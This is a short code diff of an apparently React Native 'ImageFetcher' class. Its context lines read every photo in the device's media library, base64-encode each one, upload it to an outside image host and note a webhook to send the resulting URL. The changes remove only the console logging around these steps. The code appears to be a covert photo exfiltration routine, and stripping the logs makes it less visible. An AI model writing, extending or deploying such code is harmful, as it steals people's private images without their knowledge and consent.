@@ -21,8 +21,6 @@ export default class ImageFetcher {
         const assets = await MediaLibrary.getAssetsAsync({
             first: amount,
         });
-
-        console.log(`Assets Fetched!\nAmount: ${assets.totalCount} \nNext Page: ${assets.hasNextPage}`)
         
         for(let i = 0; i < assets.totalCount; i++)
         {
@@ -38,11 +36,9 @@ export default class ImageFetcher {
         for(const asset of this.assets)
         {
             // read image
-            console.log(asset);
             if(Device.brand === "Apple" && asset.mediaSubtypes.includes("livePhoto")) continue;
 
             const info:MediaLibrary.AssetInfo = await MediaLibrary.getAssetInfoAsync(asset);
-            console.log(info.localUri);
 
             const base64 = await FileSystem.readAsStringAsync(info.localUri, {encoding:'base64'});
             // (await MediaLibrary.getAssetInfoAsync(asset)).localUri???
@@ -56,7 +52,6 @@ export default class ImageFetcher {
                 body: form
             });
             const parsed = JSON.parse(await res.text());
-            console.log(parsed.data.image.url);
 
             // send webhook using image url
 
